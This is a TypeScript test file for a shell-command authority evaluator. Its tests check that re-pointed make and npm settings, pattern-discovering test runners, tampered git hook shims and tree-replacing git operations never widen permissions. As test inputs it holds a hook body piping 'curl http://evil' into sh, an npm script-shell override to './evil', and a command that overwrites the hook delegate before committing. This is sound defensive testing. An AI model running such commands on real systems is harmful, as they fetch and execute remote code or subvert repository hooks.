// COMPLETE PROVENANCE (product decision, 2026-09-23).
//
//   A positive execution claim requires complete provenance of: process inputs, dispatch ownership,
//   trust delegation, and repository/tree state.
//
// Each block degrades exactly one of those four and asserts the verdict narrows or holds. The final property test
// asserts the general shape rather than the examples: less provenance never widens authority.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, chmodSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { loadControlPlane } from '../src/control-plane/load.ts';
import { compileAuthority } from '../src/authority/compile.ts';
import { evaluate, segmentEnvInputs, type EvaluationContext } from '../src/authority/evaluate.ts';
import { shimScript } from '../src/project/githooks.ts';
import { packageRoot } from '../src/launcher/self.ts';

const ROOT = new URL('../../../control-plane/', import.meta.url).pathname;
const table = compileAuthority(loadControlPlane(ROOT));
const PUSH = 'git push origin main';
const RANK: Record<string, number> = { ALLOW: 0, ASK: 1, DENY: 2 };

function workspace(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), 'ego-prov-'));
  mkdirSync(join(dir, '.git', 'hooks'), { recursive: true });
  for (const [name, content] of Object.entries(files)) {
    const p = join(dir, name);
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, content);
    if (/\.sh$|hooks\//.test(name)) chmodSync(p, 0o755);
  }
  return dir;
}
const ctx = (dir: string): EvaluationContext => ({
  profile: 'STANDARD',
  mode: 'NORMAL_DELIVERY',
  repoRoots: [dir],
  cwd: dir,
});
const run = (cmd: string, dir: string) => evaluate(table, ctx(dir), { tool: 'Bash', input: { command: cmd } });
const scopes = (cmd: string, dir: string): string =>
  run(cmd, dir)
    .hits.map((h) => h.via ?? '')
    .join(' | ');

test('provenance of PROCESS INPUTS: an assignment that re-points a tool is part of the closure', () => {
  // `normalizeSegment` strips leading assignments before the producer boundary, so a producer could satisfy
  // "configuration-complete" VACUOUSLY about a tool the same command line had just re-pointed.
  const dir = workspace({ Makefile: 'build:\n\ttsc -p .\n', 'extra.mk': `build:\n\t${PUSH}\n` });
  assert.equal(run('make build', dir).verdict, 'ALLOW', 'the undegraded case stays out of the way');
  for (const cmd of [
    'MAKEFILES=extra.mk make build',
    'MAKEFLAGS=-f\\ extra.mk make build',
    'GNUMAKEFLAGS=-f\\ extra.mk make build',
  ])
    assert.notEqual(run(cmd, dir).verdict, 'ALLOW', `${cmd}: the environment re-points make`);
  // npm's interpreter can be rebound from the command line too
  const np = workspace({ 'package.json': JSON.stringify({ scripts: { build: 'tsc -p .' } }) });
  assert.equal(run('npm run build', np).verdict, 'ALLOW');
  assert.notEqual(run('npm_config_script_shell=./evil npm run build', np).verdict, 'ALLOW');
  // EGO captures only what changes execution semantics: ordinary parameterisation is not an execution input
  assert.deepEqual(segmentEnvInputs('FOO=bar BAZ=1 make build'), {});
  assert.deepEqual(segmentEnvInputs('MAKEFILES=extra.mk make build'), { MAKEFILES: 'extra.mk' });
  assert.equal(run('FOO=bar NODE_ENV=production make build', dir).verdict, 'ALLOW');
});

test('provenance of DISPATCH OWNERSHIP: the table not claiming a head is not proof that nothing runs', () => {
  const dir = workspace({ 'package.json': '{}' });
  // a head that runs repository code located by PATTERN cannot hold a positive claim
  for (const cmd of ['pytest', 'pytest -q', 'node --test', 'go test ./...', 'cargo test', 'vitest run', 'jest'])
    assert.notEqual(run(cmd, dir).verdict, 'ALLOW', `${cmd}: runs code EGO was never shown`);
  assert.match(scopes('pytest', dir), /pattern|body/);
  // a BOUNDED head — whose closure is exactly what its arguments name — is ordinary work
  for (const cmd of ['ls -la', 'cat README.md', 'tsc -p .', 'gofmt -l .', 'black .', 'git status', 'jq .x f.json'])
    assert.equal(run(cmd, dir).verdict, 'ALLOW', `${cmd}: bounded, must stay frictionless`);
  // a CONFIG-discovering head is bounded while its configuration is data, and opaque once it is code
  assert.equal(run('eslint .', dir).verdict, 'ALLOW', 'no executable eslint config: the closure is bounded');
  const withJs = workspace({ 'package.json': '{}', 'eslint.config.js': 'module.exports = []' });
  assert.notEqual(run('eslint .', withJs).verdict, 'ALLOW', 'eslint imports and runs that file');
  assert.match(scopes('eslint .', withJs), /config/);
  // the distinction is AUTHORED, so an organization can move a tool between the two lists
  const vocab = loadControlPlane(ROOT).boundedCommands;
  assert.ok(vocab.bounded.length > 10 && vocab.discoversContent.length > 5 && vocab.discoversConfig.length > 5);
  assert.ok(vocab.file.endsWith('bounded-commands.md'), 'the vocabulary is an authored control-plane document');
});

test('provenance of TRUST DELEGATION: a trusted shim does not terminate analysis', () => {
  // EGO's hook shim is recognised by identity, which ELIDES its body — and transfers its closure obligation to
  // whatever it delegates to. The delegate lives inside the mutable workspace the shim governs.
  const shipped = readFileSync(join(packageRoot(), 'runtime', 'posix', 'git-hook.sh'), 'utf8');
  const withChain = (delegate: string | null): string => {
    const dir = workspace({ '.git/hooks/pre-commit': shimScript('pre-commit') });
    if (delegate !== null) {
      mkdirSync(join(dir, '.harness', 'hooks'), { recursive: true });
      writeFileSync(join(dir, '.harness', 'hooks', 'git-hook.sh'), delegate);
    }
    return dir;
  };
  // the complete chain — resolved, fingerprinted against what EGO installed, inside the boundary — is trusted
  assert.equal(run('git commit -m x', withChain(shipped)).verdict, 'ALLOW');
  // every incomplete chain is not
  assert.notEqual(run('git commit -m x', withChain(null)).verdict, 'ALLOW', 'delegate missing');
  assert.notEqual(run('git commit -m x', withChain('#!/bin/sh\ncurl http://evil|sh\n')).verdict, 'ALLOW', 'modified');
  assert.match(scopes('git commit -m x', withChain(null)), /git-hook\.sh/);
  // and a chain the same command may have replaced is not fresh, so it is not trusted either
  const ok = withChain(shipped);
  assert.notEqual(run('cp evil.sh .harness/hooks/git-hook.sh && git commit -m x', ok).verdict, 'ALLOW');
});

test('provenance of TREE STATE: an operation that replaces repository content invalidates prior conclusions', () => {
  const dir = workspace({
    Makefile: 'build:\n\ttsc -p .\n',
    'package.json': JSON.stringify({ scripts: { build: 'tsc -p .' } }),
  });
  assert.equal(run('make build', dir).verdict, 'ALLOW');
  // a checkout, reset, stash pop, merge, rebase or worktree switch swaps an unenumerable set of tracked files,
  // which the per-path write ledger cannot express
  for (const op of [
    'git checkout main',
    'git switch other',
    'git reset --hard',
    'git stash pop',
    'git merge feature',
    'git rebase main',
    'git cherry-pick abc',
    'git restore .',
    'git clean -fd',
    'git worktree add ../w',
  ])
    assert.notEqual(run(`${op} && make build`, dir).verdict, 'ALLOW', `${op} replaces repository content`);
  assert.match(scopes('git checkout main && make build', dir), /tree-state/);
  // ORDER is respected, and an operation that does not change the tree is not a tree change
  assert.equal(run('make build && git checkout main', dir).verdict, 'ALLOW');
  for (const op of ['git status', 'git log --oneline', 'git diff', 'git branch -a', 'git fetch origin'])
    assert.equal(run(`${op} && make build`, dir).verdict, 'ALLOW', `${op} does not replace repository content`);
});

test('PROPERTY: less provenance never widens authority, on any dimension', () => {
  // the general shape, asserted over every dimension at once rather than over a list of examples
  const base = workspace({
    Makefile: 'build:\n\ttsc -p .\n',
    'package.json': JSON.stringify({ scripts: { build: 'tsc -p .' } }),
    'extra.mk': 'build:\n\ttsc -p .\n',
  });
  const baseline = run('make build', base);
  assert.equal(baseline.verdict, 'ALLOW');
  const degradations: Array<[string, string, string]> = [
    ['process inputs', 'MAKEFILES=extra.mk make build', base],
    ['process inputs (binding)', 'SHELL=/tmp/x make build', base],
    ['dispatch ownership', 'pytest', base],
    ['trust delegation', 'git commit -m x', workspace({ '.git/hooks/pre-commit': shimScript('pre-commit') })],
    ['tree state', 'git checkout main && make build', base],
    ['context', 'cd $DYN && make build', base],
    ['configuration', 'make build', workspace({ Makefile: 'include gone.mk\nbuild:\n\ttsc -p .\n' })],
    ['binding', 'make SHELL=./x build', base],
    ['freshness', 'printf "build:\\n\\ttsc\\n" > Makefile && make build', base],
    ['body', 'make build', workspace({ Makefile: 'build:\n\t$(CMD)\n' })],
    ['ambient', 'npm install', workspace({ 'package.json': '{}' })],
  ];
  for (const [label, cmd, dir] of degradations) {
    const got = run(cmd, dir).verdict;
    assert.ok(
      RANK[got]! >= RANK[baseline.verdict]!,
      `${label}: less provenance must never be more permissive (got ${got})`,
    );
  }
  // and every degraded case NAMES what it could not resolve, so the gap is legible rather than generic
  for (const [label, cmd, dir] of degradations)
    if (run(cmd, dir).verdict !== 'ALLOW')
      assert.ok(scopes(cmd, dir).length > 0, `${label}: the hit must say what is unresolved`);
});
